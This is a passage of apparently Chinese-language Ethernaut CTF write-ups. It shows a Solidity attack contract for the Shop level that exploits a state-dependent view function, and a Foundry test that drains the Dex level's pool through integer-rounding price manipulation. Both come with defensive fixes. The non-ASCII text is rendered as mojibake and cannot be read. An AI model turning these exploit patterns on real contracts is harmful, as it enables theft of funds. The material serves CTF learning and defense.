è¢«è°ƒç”¨ã€‚æ­¤æ—¶ <code>isSold</code> å·²ç»æ˜¯ <code>true</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ <code>price()</code> å‡½æ•°è¿”å› <code>1</code>ã€‚<code>Shop</code> åˆçº¦çš„ <code>price</code> å˜é‡è¢«æ›´æ–°ä¸º <code>1</code>ã€‚</li>\n</ul>\n</li>\n</ol>\n<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸåœ°ä»¥ä½ä»·ä¹°ä¸‹äº†å•†å“ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦å®ç°äº† <code>Buyer</code> æ¥å£ï¼Œå…¶ <code>price()</code> å‡½æ•°æ ¹æ® <code>Shop</code> åˆçº¦çš„ <code>isSold</code> çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface IShop &#123;</span><br><span class=\"line\">    function isSold() external view returns (bool);</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">    function buy() external;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _shopAddress) &#123;</span><br><span class=\"line\">        shop = IShop(_shopAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // è¿™ä¸ª price å‡½æ•°æ˜¯æ”»å‡»çš„æ ¸å¿ƒ</span><br><span class=\"line\">    function price() public view returns (uint256) &#123;</span><br><span class=\"line\">        // å¦‚æœå•†å“è¿˜æ²¡å–å‡ºï¼Œè¿”å›é«˜ä»·ä»¥é€šè¿‡æ£€æŸ¥</span><br><span class=\"line\">        // å¦‚æœå·²ç»å–å‡ºï¼ˆåœ¨åŒä¸€æ¬¡ buy è°ƒç”¨ä¸­ï¼‰ï¼Œè¿”å›ä½ä»·æ¥æ›´æ–° price</span><br><span class=\"line\">        if (shop.isSold()) &#123;</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return 101;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        shop.buy();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/21_Shop.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Attack contract (as defined above)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\">    constructor(address _shop) &#123; shop = IShop(_shop); &#125;</span><br><span class=\"line\">    function price() public view returns (uint256) &#123; return shop.isSold() ? 1 : 101; &#125;</span><br><span class=\"line\">    function attack() public &#123; shop.buy(); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ShopTest is Test &#123;</span><br><span class=\"line\">    Shop instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Shop();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æ˜¯å¦æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.price(), 1, &quot;Price should be updated to 1&quot;);</span><br><span class=\"line\">        assertTrue(instance.isSold(), &quot;isSold should be true&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>: åˆ›å»º <code>Attack</code> åˆçº¦ï¼Œå®ƒå®ç°äº† <code>Buyer</code> æ¥å£ã€‚</li>\n<li><strong>è°ƒç”¨ <code>attack()</code></strong>: <code>Attack</code> åˆçº¦çš„ <code>attack()</code> å‡½æ•°è°ƒç”¨ <code>Shop</code> åˆçº¦çš„ <code>buy()</code> å‡½æ•°ã€‚</li>\n<li><strong>åŒé‡è¿”å›å€¼</strong>: <code>Shop</code> åˆçº¦åœ¨åŒä¸€æ¬¡ <code>buy()</code> è°ƒç”¨ä¸­ä¸¤æ¬¡è°ƒç”¨ <code>Attack</code> åˆçº¦çš„ <code>price()</code> å‡½æ•°ï¼Œä½†ç”±äº <code>Shop</code> çš„å†…éƒ¨çŠ¶æ€ <code>isSold</code> å‘ç”Ÿäº†å˜åŒ–ï¼Œ<code>Attack</code> çš„ <code>price()</code> å‡½æ•°è¿”å›äº†ä¸¤ä¸ªä¸åŒçš„å€¼ï¼Œä»è€Œç»•è¿‡äº†é€»è¾‘æ£€æŸ¥å¹¶ä»¥ä½ä»·æˆäº¤ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>ä¸è¦åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­å¤šæ¬¡è°ƒç”¨å¤–éƒ¨ <code>view</code> å‡½æ•°</strong>: å¦‚æœå¿…é¡»è¿™æ ·åšï¼Œè¯·å°†ç¬¬ä¸€æ¬¡è°ƒç”¨çš„è¿”å›å€¼å­˜å‚¨åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œå¹¶åœ¨åç»­é€»è¾‘ä¸­ä½¿ç”¨è¿™ä¸ªå±€éƒ¨å˜é‡ï¼Œè€Œä¸æ˜¯å†æ¬¡è¿›è¡Œå¤–éƒ¨è°ƒç”¨ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">function buy() public &#123;</span><br><span class=\"line\">    Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\">    uint _price = _buyer.price(); // åªè°ƒç”¨ä¸€æ¬¡ï¼Œå¹¶å°†ç»“æœå­˜å…¥å±€éƒ¨å˜é‡</span><br><span class=\"line\"></span><br><span class=\"line\">    if (_price &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">        isSold = true;</span><br><span class=\"line\">        price = _price; // ä½¿ç”¨å±€éƒ¨å˜é‡</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼</strong>: å°½ç®¡æœ¬ä¾‹ä¸­çš„äº¤äº’æ˜¯ä¸€ä¸ª <code>view</code> å‡½æ•°ï¼Œä½†å®ƒä»ç„¶æ˜¯ä¸å¤–éƒ¨åˆçº¦çš„äº¤äº’ã€‚æœ€ä½³å®è·µæ˜¯åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ï¼ˆâ€œç”Ÿæ•ˆâ€ï¼‰ä¹‹åå†è¿›è¡Œäº¤äº’ã€‚ç„¶è€Œï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œæ›´å¥½çš„ä¿®å¤æ–¹æ³•æ˜¯ç¼“å­˜è¿”å›å€¼ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong><code>view</code> å‡½æ•°çš„è¯¯è§£</strong>: <code>view</code> å…³é”®å­—åªå‘ç¼–è¯‘å™¨æ‰¿è¯ºè¯¥å‡½æ•°ä¸ä¼šä¿®æ”¹çŠ¶æ€ã€‚å®ƒå¹¶ä¸ä¿è¯å‡½æ•°çš„è¿”å›å€¼æ˜¯çº¯ç²¹çš„æˆ–åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­ä¿æŒä¸å˜ã€‚</li>\n<li><strong>è·¨åˆçº¦è°ƒç”¨çš„çŠ¶æ€ä¾èµ–</strong>: ä¸€ä¸ªåˆçº¦çš„å‡½æ•°å¯ä»¥ä¾èµ–äºå¦ä¸€ä¸ªåˆçº¦çš„çŠ¶æ€ï¼Œè¿™å¯èƒ½å¯¼è‡´åƒæœ¬ä¾‹ä¸­è¿™æ ·æ„æƒ³ä¸åˆ°çš„è¡Œä¸ºã€‚</li>\n<li><strong>Foundry <code>prank</code></strong>: æ¨¡æ‹Ÿæ¥è‡ªç‰¹å®šåœ°å€ï¼ˆ<code>player</code> -&gt; <code>attacker</code>ï¼‰çš„è°ƒç”¨é“¾ï¼Œæ˜¯æµ‹è¯•æ­¤ç±»äº¤äº’å¼æ”»å‡»çš„ç†æƒ³å·¥å…·ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>å¤–éƒ¨ <code>view</code> å‡½æ•°çš„è¿”å›å€¼ä¸æ˜¯æ’å®šçš„ï¼Œå®ƒå¯ä»¥åœ¨ä¸€æ¬¡äº¤æ˜“çš„ä¸åŒé˜¶æ®µå‘ç”Ÿå˜åŒ–ã€‚</li>\n<li>åœ¨ä¸€æ¬¡å‡½æ•°æ‰§è¡Œä¸­å¤šæ¬¡è°ƒç”¨åŒä¸€ä¸ªå¤–éƒ¨ <code>view</code> å‡½æ•°æ˜¯ä¸€ä¸ªå±é™©çš„æ¨¡å¼ï¼Œå› ä¸ºå®ƒçš„è¿”å›å€¼å¯èƒ½åœ¨ä½ æ„æƒ³ä¸åˆ°çš„æ—¶å€™å‘ç”Ÿæ”¹å˜ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>è®¾è®¡ä¸€ä¸ªæ¶æ„çš„ <code>view</code> å‡½æ•°ï¼Œä½¿å…¶æ ¹æ®ç›®æ ‡åˆçº¦çš„çŠ¶æ€è¿”å›ä¸åŒçš„å€¼ã€‚</li>\n<li>åˆ©ç”¨ç›®æ ‡åˆçº¦åœ¨æ£€æŸ¥å’Œæ‰§è¡Œé˜¶æ®µä¹‹é—´çŠ¶æ€çš„å˜åŒ–ï¼Œæ¥æ“çºµ <code>view</code> å‡½æ•°çš„è¿”å›å€¼ï¼Œä»è€Œç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å½“éœ€è¦å¤šæ¬¡ä½¿ç”¨å¤–éƒ¨è°ƒç”¨çš„ç»“æœæ—¶ï¼Œåº”å°†å…¶ç¼“å­˜åœ¨ä¸€ä¸ªå±€éƒ¨å˜é‡ä¸­ï¼Œä»¥ç¡®ä¿å…¶åœ¨æ•´ä¸ªå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¸€è‡´æ€§ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#view-functions\">Solidity Docs: View Functions</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-113\">SWC-113: DoS with Failed Call</a> (è™½ç„¶ä¸æ˜¯ç›´æ¥çš„DoSï¼Œä½†åŸç†ç›¸ä¼¼ï¼Œéƒ½æ¶‰åŠåˆ°å¯¹å¤–éƒ¨è°ƒç”¨ç»“æœçš„é”™è¯¯å¤„ç†)</li>\n</ul>\n"},{"title":"Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´","date":"2025-01-25T08:55:00.000Z","updated":"2025-01-25T08:55:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"åˆ©ç”¨ä¸€ä¸ªç®€æ˜“DEXä¸­ç”±äºæ•´æ•°é™¤æ³•èˆå…¥è¯¯å·®å¯¼è‡´çš„ä»·æ ¼è®¡ç®—æ¼æ´ï¼Œé€šè¿‡å¤šæ¬¡å°é¢äº¤æ˜“æ¥è€—å°½æ± ä¸­å…¶ä¸­ä¸€ç§ä»£å¸çš„æµåŠ¨æ€§ã€‚å­¦ä¹ å¦‚ä½•é€šè¿‡åå¤äº¤æ¢æ¥æ”¾å¤§èˆå…¥è¯¯å·®ï¼Œæœ€ç»ˆå®ç°å¯¹ä»·æ ¼çš„å®Œå…¨æ“çºµã€‚","_content":"\n# ğŸ¯ Ethernaut Level 22: Dex - ä»·æ ¼æ“çºµä¸æ•´æ•°èˆå…¥æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 22 - Dex](https://ethernaut.openzeppelin.com/level/22)  \n> **æ”»å‡»ç±»å‹**: ä»·æ ¼æ“çºµ / æ•´æ•°èˆå…¥æ¼æ´  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½ å’Œ `Dex` åˆçº¦æœ€åˆéƒ½æ‹¥æœ‰ `Token1` å’Œ `Token2`ã€‚ä½ çš„ç›®æ ‡æ˜¯è€—å°½ `Dex` åˆçº¦ä¸­ `Token1` æˆ– `Token2` çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚\n\n-   **åˆå§‹çŠ¶æ€**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¿™ä¸ª `Dex` åˆçº¦æ˜¯ä¸€ä¸ªæç®€çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼Œå…¶æ ¸å¿ƒæ¼æ´åœ¨äºå®ƒçš„ä»·æ ¼è®¡ç®—å‡½æ•° `getSwapPrice()`ï¼š\n\n```solidity\nfunction getSwapPrice(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));\n}\n```\n\nè¿™ä¸ªå‡½æ•°é€šè¿‡ä¸¤ç§ä»£å¸åœ¨æ± ä¸­ä½™é¢çš„æ¯”ä¾‹æ¥è®¡ç®—äº¤æ¢ä»·æ ¼ã€‚é—®é¢˜å‡ºåœ¨ Solidity çš„æ•´æ•°é™¤æ³•ä¸Šã€‚æ•´æ•°é™¤æ³•ä¼šå‘ä¸‹èˆå…¥åˆ°æœ€æ¥è¿‘çš„æ•´æ•°ï¼Œä»»ä½•å°æ•°éƒ¨åˆ†éƒ½ä¼šè¢«ä¸¢å¼ƒã€‚ä¾‹å¦‚ï¼Œ`7 / 2` çš„ç»“æœæ˜¯ `3`ï¼Œè€Œä¸æ˜¯ `3.5`ã€‚\n\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªèˆå…¥è¯¯å·®æ¥è·åˆ©ã€‚é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„äº¤æ¢é¡ºåºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯æ¬¡äº¤æ¢ä¸­è·å¾—æ¯”é¢„æœŸâ€œå…¬å¹³â€ä»·æ ¼æ›´å¤šçš„ä»£å¸ï¼Œä»è€Œé€æ¸è€—å°½æ± ä¸­çš„èµ„é‡‘ã€‚\n\n### æ”»å‡»æµç¨‹\n\næˆ‘ä»¬çš„ç­–ç•¥æ˜¯é€šè¿‡åœ¨ä¸¤ç§ä»£å¸ä¹‹é—´åå¤äº¤æ¢æˆ‘ä»¬çš„å…¨éƒ¨ä½™é¢æ¥æ”¾å¤§è¿™ä¸ªèˆå…¥è¯¯å·®ã€‚\n\n1.  **åˆå§‹çŠ¶æ€**: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). ä»·æ ¼æ¯”ä¸º 1:1ã€‚\n\n2.  **ç¬¬ä¸€æ¬¡äº¤æ¢ (10 TKN1 -> TKN2)**:\n    -   `amountOut = (10 * 100) / 100 = 10`\n    -   Player: (0 TKN1, 20 TKN2)\n    -   Dex: (110 TKN1, 90 TKN2)\n\n3.  **ç¬¬äºŒæ¬¡äº¤æ¢ (20 TKN2 -> TKN1)**:\n    -   `amountOut = (20 * 110) / 90 = 24.44...` -> **èˆå…¥åä¸º 24**\n    -   Player: (24 TKN1, 0 TKN2)\n    -   Dex: (86 TKN1, 110 TKN2)\n\n4.  **ç¬¬ä¸‰æ¬¡äº¤æ¢ (24 TKN1 -> TKN2)**:\n    -   `amountOut = (24 * 110) / 86 = 30.69...` -> **èˆå…¥åä¸º 30**\n    -   Player: (0 TKN1, 30 TKN2)\n    -   Dex: (110 TKN1, 80 TKN2)\n\n5.  **ç¬¬å››æ¬¡äº¤æ¢ (30 TKN2 -> TKN1)**:\n    -   `amountOut = (30 * 110) / 80 = 41.25` -> **èˆå…¥åä¸º 41**\n    -   Player: (41 TKN1, 0 TKN2)\n    -   Dex: (69 TKN1, 110 TKN2)\n\n6.  **ç¬¬äº”æ¬¡äº¤æ¢ (41 TKN1 -> TKN2)**:\n    -   `amountOut = (41 * 110) / 69 = 65.36...` -> **èˆå…¥åä¸º 65**\n    -   Player: (0 TKN1, 65 TKN2)\n    -   Dex: (110 TKN1, 45 TKN2)\n\nç°åœ¨ï¼Œæˆ‘ä»¬æ‰‹ä¸Šæœ‰65ä¸ªTKN2ï¼Œè€ŒDexæ± ä¸­åªå‰©ä¸‹110ä¸ªTKN1å’Œ45ä¸ªTKN2ã€‚æˆ‘ä»¬åªéœ€è¦ç”¨45ä¸ªTKN2å°±å¯ä»¥æ¢èµ°æ± é‡Œæ‰€æœ‰çš„110ä¸ªTKN1ã€‚\n\n7.  **æœ€ç»ˆäº¤æ¢ (45 TKN2 -> TKN1)**:\n    -   `amountOut = (45 * 110) / 45 = 110`\n    -   Player: (110 TKN1, 20 TKN2)\n    -   Dex: (0 TKN1, 90 TKN2) -> **TKN1 è¢«è€—å°½ï¼**\n\né€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬åˆ©ç”¨äº†æ•´æ•°é™¤æ³•çš„èˆå…¥è¯¯å·®ï¼Œåœ¨æ¯æ¬¡äº¤æ˜“ä¸­éƒ½è·å¾—äº†å¾®å°çš„ä¼˜åŠ¿ï¼Œå¹¶æœ€ç»ˆå°†è¿™ç§ä¼˜åŠ¿ç´¯ç§¯åˆ°è¶³ä»¥æ¸…ç©ºæ•´ä¸ªæ± å­ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### Foundry æµ‹è¯•ä»£ç \n\næµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„äº¤æ¢æµç¨‹ã€‚\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/22_Dex.sol\";\n\ncontract DexTest is Test {\n    Dex instance;\n    address player;\n    SwappableToken token1;\n    SwappableToken token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Dex();\n\n        // éƒ¨ç½²å¹¶è®¾ç½®ä»£å¸\n        token1 = new SwappableToken(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableToken(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // æ·»åŠ æµåŠ¨æ€§\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.addLiquidity(address(token1), 100);\n        instance.addLiquidity(address(token2), 100);\n\n        // å‘é€åˆå§‹ä»£å¸ç»™ player\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexAttack() public {\n        vm.startPrank(player);\n\n        // æˆæƒ Dex åˆçº¦æ— é™é‡çš„ä»£å¸\n        token1.approve(address(instance), type(uint256).max);\n        token2.approve(address(instance), type(uint256).max);\n\n        // æ‰§è¡Œæ”»å‡»æµç¨‹\n        swapAll(address(token1), address(token2)); // 10 TKN1 -> 10 TKN2\n        swapAll(address(token2), address(token1)); // 20 TKN2 -> 24 TKN1\n        swapAll(address(token1), address(token2)); // 24 TKN1 -> 30 TKN2\n        swapAll(address(token2), address(token1)); // 30 TKN2 -> 41 TKN1\n        swapAll(address(token1), address(token2)); // 41 TKN1 -> 65 TKN2\n        \n        // æœ€ç»ˆä¸€å‡»\n        instance.swap(address(token2), address(token1), 45);\n\n        // éªŒè¯ Dex ä¸­è‡³å°‘ä¸€ç§ä»£å¸å·²è¢«è€—å°½\n        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of one token\");\n\n        vm.stopPrank();\n    }\n\n    // è¾…åŠ©å‡½æ•°ï¼Œç”¨äºäº¤æ¢æŒ‡å®šä»£å¸çš„å…¨éƒ¨ä½™é¢\n    function swapAll(address tokenIn, address tokenOut) internal {\n        uint256 balance = IERC20(tokenIn).balanceOf(player);\n        instance.swap(tokenIn, tokenOut, balance);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **æˆæƒ**: æˆæƒ `Dex` åˆçº¦å¯ä»¥ä»ä½ çš„åœ°å€è½¬ç§» `Token1` å’Œ `Token2`ã€‚\n2.  **åå¤äº¤æ¢**: åœ¨ `Token1` å’Œ `Token2` ä¹‹é—´æ¥å›äº¤æ¢ä½ çš„å…¨éƒ¨ä½™é¢ã€‚\n3.  **åˆ©ç”¨è¯¯å·®**: æ¯æ¬¡äº¤æ¢éƒ½ä¼šå› ä¸ºæ•´æ•°é™¤æ³•çš„èˆå…¥è€Œäº§ç”Ÿå¾®å°çš„åˆ©æ¶¦ã€‚\n4.  **ç´¯ç§¯ä¼˜åŠ¿**: é‡å¤äº¤æ¢ï¼Œç›´åˆ°ä½ æ‹¥æœ‰çš„ä»£å¸æ•°é‡è¶³ä»¥ä¸€æ¬¡æ€§æ¢èµ°æ± ä¸­å‰©ä½™çš„æ‰€æœ‰å¦ä¸€ç§ä»£å¸ã€‚\n5.  **æœ€ç»ˆä¸€å‡»**: æ‰§è¡Œæœ€åä¸€æ¬¡äº¤æ¢ï¼Œæ¸…ç©ºæ± å­ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **é¿å…ä»·æ ¼æ“çºµ**: ç®€å•çš„ `balanceOf(A) / balanceOf(B)` ä»·æ ¼å…¬å¼ææ˜“å—åˆ°æ“çºµã€‚ç°ä»£DEXï¼ˆå¦‚Uniswap V2ï¼‰ä½¿ç”¨ `x * y = k` çš„æ’å®šä¹˜ç§¯å…¬å¼ï¼Œè¿™ä½¿å¾—æ“çºµä»·æ ¼çš„æˆæœ¬è¦é«˜å¾—å¤šã€‚\n2.  **å¤„ç†èˆå…¥è¯¯å·®**: åœ¨é‡‘èè®¡ç®—ä¸­ï¼Œå¿…é¡»ä»”ç»†å¤„ç†ç²¾åº¦é—®é¢˜ã€‚å¯ä»¥è€ƒè™‘ï¼š\n    *   å°†è®¡ç®—é¡ºåºè°ƒæ•´ä¸ºå…ˆä¹˜åé™¤ï¼Œä»¥å‡å°‘ç²¾åº¦æŸå¤±ã€‚\n    *   ä½¿ç”¨æ›´é«˜ç²¾åº¦çš„æ•°å­¦åº“ï¼Œå¦‚ `SafeMath` æˆ–ä¸“é—¨çš„å®šç‚¹æ•°åº“ã€‚\n3.  **ä½¿ç”¨å»ä¸­å¿ƒåŒ–é¢„è¨€æœº**: å¯¹äºéœ€è¦å¯é ä»·æ ¼çš„åº”ç”¨ï¼Œä¸åº”ä¾èµ–äºå•ä¸ªDEXæ± çš„ç¬æ—¶ä»·æ ¼ã€‚åº”ä½¿ç”¨æ›´ç¨³å¥çš„ä»·æ ¼æ¥æºï¼Œå¦‚ Chainlink æˆ– Uniswap V3 çš„æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ˆTWAPï¼‰é¢„è¨€æœºã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **DEX (å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€)**: ä¸€ç§åŸºäºæ™ºèƒ½åˆçº¦çš„äº¤æ˜“æ‰€ï¼Œå…è®¸ç”¨æˆ·åœ¨æ²¡æœ‰ä¸­å¿ƒåŒ–ä¸­ä»‹çš„æƒ…å†µä¸‹äº¤æ˜“åŠ å¯†èµ„äº§ã€‚\n-   **ä»·æ ¼é¢„è¨€æœº (Price Oracle)**: ä¸ºæ™ºèƒ½åˆçº¦æä¾›é“¾ä¸‹æˆ–é“¾ä¸Šèµ„äº§ä»·æ ¼ä¿¡æ¯çš„æœåŠ¡ã€‚\n-   **æ•´æ•°é™¤æ³•**: 